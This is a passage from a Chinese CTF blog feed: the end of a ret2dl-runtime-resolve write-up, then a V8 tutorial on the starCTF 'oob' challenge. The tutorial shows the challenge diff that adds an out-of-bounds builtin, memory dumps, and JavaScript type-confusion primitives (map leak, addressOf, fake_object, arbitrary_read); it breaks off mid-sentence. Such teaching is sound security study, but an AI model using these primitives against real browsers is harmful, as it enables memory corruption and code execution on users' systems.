p64(fake_link_map_addr)+p64(<span class="number">0</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这里再次审视这段exp，可以发现<code>l_addr</code>其实就是<code>read</code>函数和<code>system</code>函数之间的差值，而<code>sym-&gt;d_val</code>就是<code>read</code>函数的地址，并且可以将这篇文章的代码进行编译会发现他的got表中<code>read</code>函数不是首位，第一个函数是<code>_libc_start_main</code>这也刚好可以让<code>sym-&gt;st_other</code>不为0从而进入else。</p><h3 id="与Full的差别"><a href="#与Full的差别" class="headerlink" title="与Full的差别"></a>与Full的差别</h3><p>可以很明显的看出来，这道题目所利用的方式其实是走的if分支而不是else，因为这道题压根没给libc所以无法计算偏移。虽然我在构造sym结构体的时候选择了<code>read@got - 8</code>的位置，但是属于是瞎猫碰到死耗子这个题目中的<code>read</code>就是got表中的第一个函数，所以才没有导致<code>sym-&gt;st_other</code>为非0。</p><p>可能大家会疑惑为什么这里能够走上面的if语句，又是因为运气好（可能是做题运气用完了，国赛啥都没抽到😭），在进行时ndx又是为0。当然如果不为0我们可以采取上面的第二种办法，直接覆盖<code>0x1d0</code>为0即可。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230728222143061.png"                      alt="image-20230728222143061"                ></p><hr><p>参考链接：</p><p>​    <a class="link"   href="https://inaz2.hatenablog.com/entry/2014/07/29/020112" >https://inaz2.hatenablog.com/entry/2014/07/29/020112<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://elixir.bootlin.com/glibc/latest/source/elf/dl-runtime.c#L41" >https://elixir.bootlin.com/glibc/latest/source/elf/dl-runtime.c#L41<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在先前其实我已经写过一篇&lt;a href=&quot;https://cv196082.gitee.io/2022/02/03/ret2dl-runti</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="dl-runtime-resolve" scheme="https://cv196082.gitee.io/tags/dl-runtime-resolve/"/>
    
    <category term="Full RELRO" scheme="https://cv196082.gitee.io/tags/Full-RELRO/"/>
    
  </entry>
  
  <entry>
    <title>v8初体验</title>
    <link href="https://cv196082.gitee.io/2023/06/27/v8%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>https://cv196082.gitee.io/2023/06/27/v8%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2023-06-27T12:05:06.000Z</published>
    <updated>2023-06-27T12:05:13.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这段事情因为各种事情耽搁，一直没有更新文章。本打算新的一篇出<code>rootkit</code>来水一篇，后面发现a3佬写的太多了，不想继续看了。然后前阵子一直在思考后续到底是学什么方向，在docker逃逸、chrome内核、iot还有fuzz之间犹豫不决，现在也算是下定决心来学学chrome了，只希望能够快点搞完，后面还是打算更多的去学习docker逃逸。</p><p>这里就不提环境安装的事情了，网上有很多相关资料。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>js作为一个面向对象编程的语言，他的变量都是以类的形式表现的。并且js作为动态语言，他的类成员是可以改变的，这也就导致他在内存中的存在形式相交与C语言要复杂的多。</p><p>使用如下程序进行调试：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> int_arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> float_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span> : <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> object_arr = [obj, obj, obj];</span><br><span class="line"><span class="keyword">var</span> newed_arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">%DebugPrint(int_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">%DebugPrint(float_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">%DebugPrint(object_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">%DebugPrint(newed_arr);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>上面的<code>%DebugPrint(int_arr)</code>的作用是打印出<code>int_arr</code>的内存信息，也就是打印出内存地址。后面的<code>%SystemBreak()</code>函数则是将控制权交给gdb。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">0x011117f8df01 &lt;JSArray[3]&gt;</span><br><span class="line">... ...</span><br><span class="line">pwndbg&gt; job 0x011117f8df01</span><br><span class="line">0x11117f8df01: [JSArray]</span><br><span class="line"> - map: 0x07bd46242d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x011117f8de19 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x011117f8de19 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; telescope 0x011117f8df01-1</span><br><span class="line">00:0000│  0x11117f8df00 —▸ 0x7bd46242d99 ◂— 0x40000020b620c01</span><br><span class="line">01:0008│  0x11117f8df08 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">02:0010│  0x11117f8df10 —▸ 0x11117f8de19 ◂— 0x20b620c08</span><br><span class="line">03:0018│  0x11117f8df18 ◂— 0x300000000</span><br><span class="line">04:0020│  0x11117f8df20 —▸ 0x20b620c14f9 ◂— 0x20b620c01</span><br><span class="line">05:0028│  0x11117f8df28 ◂— 0x300000000</span><br><span class="line">06:0030│  0x11117f8df30 ◂— 0x3ff199999999999a</span><br><span class="line">07:0038│  0x11117f8df38 ◂— 0x3ff3333333333333</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x011117f8de19-1</span><br><span class="line">00:0000│  0x11117f8de18 —▸ 0x20b620c0851 ◂— 0x20b620c01</span><br><span class="line">01:0008│  0x11117f8de20 ◂— 0x300000000</span><br><span class="line">02:0010│  0x11117f8de28 ◂— 0x100000000</span><br><span class="line">03:0018│  0x11117f8de30 ◂— 0x200000000</span><br><span class="line">04:0020│  0x11117f8de38 ◂— 0x300000000</span><br><span class="line">05:0028│  0x11117f8de40 —▸ 0x20b620c0801 ◂— 0x20b620c01</span><br><span class="line">06:0030│  0x11117f8de48 ◂— 0x300000000</span><br><span class="line">07:0038│  0x11117f8de50 —▸ 0xeff64df451 ◂— 0x9a0000020b620c05</span><br></pre></td></tr></table></figure><p>从上面可以看到，这里打印出来的是一个int类型的数组，在使用job命令可以清晰的看到这块内存的数据结构。首先是一个指向map的指针，随后在job显示的和<code>telescope</code>出来的内容有一定出入，这里我选择相信<code>telescope</code>，所以第二个成员应该是<code>properties</code>，随后就是<code>elements</code>指针，最后就是<code>length</code>。可以看出来<code>elements</code>指针就是真正指向数据的指针，并且在后面紧跟了<code>elements</code>内存区域的结构。</p><h2 id="starCTF-oob"><a href="#starCTF-oob" class="headerlink" title="starCTF oob"></a>starCTF oob</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><p>整个题目就只有这样一个diff文件，这里主要需要注意的是中间那一块+号区域，在周围只是为了能够正常进行编译才添加的。</p><p>可以看到添加的这个函数在一开始就对参数的数量进行了判断，如果参数数量大于2则返回<code>undefined</code>，随后接受第一个到<code>receiver</code>中，进一步得到JSArray结构的变量array，紧接着通过array变量取出对应的<code>elements</code>，并且在最后拿到了数组的长度。</p><p>然后函数又进行判断，如果参数的数量为1则返回数组末尾的后一个地址的值，也就出现了越界读取的漏洞。</p><p>如果参数的数量为2则获取第二个参数到<code>value</code>中，然后写到数组末尾的后一个地址，也就出现了越界写的漏洞。</p><p><strong>需要注意的是，这里函数参数的第一个参数默认为this，所以 test_arr.oob() 的含义为一个参数</strong></p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>其实通过前面的基础知识章节和这里的漏洞分析之后可以很容易的看出来，在操作数组中的内容时都是这样一层一层找下去的。</p><p>而在js中对于数组中不是只能存放整型的变量，还可以存放各种类型的对象，而如何区分数组中变量类型就需要用到<code>JSArray</code>中的map成员进行区分。所以如果我们可以修改map成员即可实现类型混淆。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>虽然是找到了漏洞点，并且也知道了存在类型混淆的可能性，但根据目前的情况仍无法继续操作。因为可以看到前面我们在看<code>elements</code>结构中并没有看到map，也就无利用之谈了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x011117f8df49</span><br><span class="line">0x11117f8df49: [JSArray]</span><br><span class="line"> - map: 0x07bd46242ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x011117f8df21 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x011117f8df21 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 1.2</span><br><span class="line">           2: 1.3</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; telescope 0x011117f8df49-1</span><br><span class="line">00:0000│  0x11117f8df48 —▸ 0x7bd46242ed9 ◂— 0x40000020b620c01</span><br><span class="line">01:0008│  0x11117f8df50 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">02:0010│  0x11117f8df58 —▸ 0x11117f8df21 ◂— 0x20b620c14</span><br><span class="line">03:0018│  0x11117f8df60 ◂— 0x300000000</span><br><span class="line">04:0020│  0x11117f8df68 —▸ 0x7bd4624ab39 ◂— 0x40000020b620c01</span><br><span class="line">05:0028│  0x11117f8df70 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">06:0030│  0x11117f8df78 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">07:0038│  0x11117f8df80 ◂— 0x100000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x011117f8df21-1</span><br><span class="line">00:0000│  0x11117f8df20 —▸ 0x20b620c14f9 ◂— 0x20b620c01</span><br><span class="line">01:0008│  0x11117f8df28 ◂— 0x300000000</span><br><span class="line">02:0010│  0x11117f8df30 ◂— 0x3ff199999999999a</span><br><span class="line">03:0018│  0x11117f8df38 ◂— 0x3ff3333333333333</span><br><span class="line">04:0020│  0x11117f8df40 ◂— 0x3ff4cccccccccccd</span><br><span class="line">05:0028│  0x11117f8df48 —▸ 0x7bd46242ed9 ◂— 0x40000020b620c01</span><br><span class="line">06:0030│  0x11117f8df50 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">07:0038│  0x11117f8df58 —▸ 0x11117f8df21 ◂— 0x20b620c14</span><br></pre></td></tr></table></figure><p>但是在后续看浮点数中可以看到map的地址紧邻者<code>elements</code>的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x011117f8dfe1</span><br><span class="line">0x11117f8dfe1: [JSArray]</span><br><span class="line"> - map: 0x07bd46242f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x011117f8dfb9 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x011117f8dfb9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">         0-2: 0x011117f8df69 &lt;Object map = 0x7bd4624ab39&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; telescope 0x011117f8dfe1-1 20</span><br><span class="line">00:0000│  0x11117f8dfe0 —▸ 0x7bd46242f79 ◂— 0x40000020b620c01</span><br><span class="line">01:0008│  0x11117f8dfe8 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">02:0010│  0x11117f8dff0 —▸ 0x11117f8dfb9 ◂— 0x20b620c08</span><br><span class="line">03:0018│  0x11117f8dff8 ◂— 0x300000000</span><br><span class="line">04:0020│  0x11117f8e000 —▸ 0x7bd46242e89 ◂— 0x40000020b620c01</span><br><span class="line">05:0028│  0x11117f8e008 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">06:0030│  0x11117f8e010 —▸ 0x11117f8e031 ◂— 0x20b620c08</span><br><span class="line">07:0038│  0x11117f8e018 ◂— 0x300000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x011117f8dfb9-1</span><br><span class="line">00:0000│  0x11117f8dfb8 —▸ 0x20b620c0801 ◂— 0x20b620c01</span><br><span class="line">01:0008│  0x11117f8dfc0 ◂— 0x300000000</span><br><span class="line">02:0010│  0x11117f8dfc8 —▸ 0x11117f8df69 ◂— 0x71000007bd4624ab</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">05:0028│  0x11117f8dfe0 —▸ 0x7bd46242f79 ◂— 0x40000020b620c01</span><br><span class="line">06:0030│  0x11117f8dfe8 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">07:0038│  0x11117f8dff0 —▸ 0x11117f8dfb9 ◂— 0x20b620c08</span><br></pre></td></tr></table></figure><p>同样的，我们在数组中全是对象的时候也可以看到map的地址紧邻着这些数据。</p><p>注意那个地址的最后，它的值看起来不是对齐的。这是因为v8里有个<code>tagged pointer</code>机制，一个地址指向的如果不是SMI（就是小整数)，它的最低位就会打上一个标记，就会有个1，看起来就不是对齐的，用的时候要减1。</p><p>接着需要思考的事，一个越界读写能给我造成什么样的效果呢？</p><h4 id="1-泄漏map地址"><a href="#1-泄漏map地址" class="headerlink" title="1. 泄漏map地址"></a><strong>1. 泄漏map地址</strong></h4><p>这里泄漏map地址就很简单，在数组中的成员为对象和浮点型的时候直接调用oob函数即可获取到。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br></pre></td></tr></table></figure><h4 id="2-类型混淆获取任意对象地址"><a href="#2-类型混淆获取任意对象地址" class="headerlink" title="2. 类型混淆获取任意对象地址"></a><strong>2. 类型混淆获取任意对象地址</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">  obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">  obj_array.oob(flt_array_map);</span><br><span class="line">  <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">  obj_array.oob(obj_array_map);</span><br><span class="line">  <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的实现原理也是非常简单，首先就是将需要获取地址的对象放到<code>obj_array</code>中，随后使用<code>oob</code>函数将<code>flt_array_map</code>的地址写进去，这时再去访问<code>obj_array</code>中的成员时就会以float的形式返回出对应的地址了，最后在恢复类型即可。</p><h4 id="3-讲任意地址当作对象"><a href="#3-讲任意地址当作对象" class="headerlink" title="3. 讲任意地址当作对象"></a><strong>3. 讲任意地址当作对象</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">  flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">  flt_array.oob(obj_array_map);</span><br><span class="line">  <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">  flt_array.oob(flt_array_map);</span><br><span class="line">  <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实道理和上一步类似。</p><h4 id="4-实现任意地址读取"><a href="#4-实现任意地址读取" class="headerlink" title="4. 实现任意地址读取"></a><strong>4. 实现任意地址读取</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">  arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">  <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>首先这里是吧<code>arb_rw_arr</code>这个数组的<code>elements</code>区域当作的是一个<code>JSArray</code>结构体，而这个结构对应的指针为<code>fake_obj</code>。</p><p>这里主要解释一下第二行代码调用函数的部分，这里首先是拿到<code>arb_rw_arr</code>对象的地址，随后减去<code>0x20</code>则是因为<code>JSArray</code>和<code>elements</code>相距固定偏移为<code>0x30</code>，这里减去0x20的话代表将<code>elements + 0x10</code>当做了<code>fake JSArray</code>，根据前面的调试得知在<code>elements + 0x10</code>的位置开始为数组中数据的部分，所以我们现在是可以实现任意修改<code>fake_obj</code>的<code>JSArray</code>部分。</p><p>然后就是这里返回的<code>fake_obj</code>对象，这个对象实质指向的是就是<code>arb_rw_arr</code>的<code>elements + 